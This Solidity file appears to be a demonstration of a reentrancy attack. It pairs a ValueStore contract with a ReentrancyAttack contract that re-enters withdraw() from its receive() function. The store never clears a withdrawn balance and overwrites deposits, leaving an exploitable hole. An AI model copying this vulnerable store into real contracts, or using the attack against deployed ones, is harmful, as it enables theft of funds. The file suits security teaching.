// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract ValueStore {
  mapping(address => uint) public balances;
  bool locked;

  event EvDeposit(address indexed sender, uint value);
  event EvWithdraw(address indexed withdrawer, uint value);

  error ErrLocked();
  error ErrNothingToWithdraw(address sender);
  error ErrWithdraw(address withdrawer, uint value);

  modifier lock() {
    require(!locked, ErrLocked());
    locked = true;
    _;
    locked = false;
  }

  receive() external payable {
    balances[msg.sender] = msg.value;
    console.log("<== deposit %s", msg.value);
    emit EvDeposit(msg.sender, msg.value);
  }

  function withdraw() external lock {
    address withdrawer = msg.sender;
    uint value = balances[withdrawer];
    require(value > 0, ErrNothingToWithdraw(withdrawer));
    (bool success, ) = withdrawer.call{value: value}("");
    require(success, ErrWithdraw(withdrawer, value));
    console.log("==> withdraw %s", value);
    emit EvWithdraw(withdrawer, value);
  }
}

contract ReentrancyAttack {
  ValueStore store;

  error ErrDeposit(address attacker, uint value);

  constructor(address payable valueStore) payable {
    store = ValueStore(valueStore);
  }

  receive() external payable {
    if (address(store).balance > 0) {
      store.withdraw();
    }
  }

  function attack(uint depositValue) external {
    (bool success, ) = address(store).call{value: depositValue}("");
    require(success, ErrDeposit(address(this), depositValue));
    store.withdraw();
  }
}
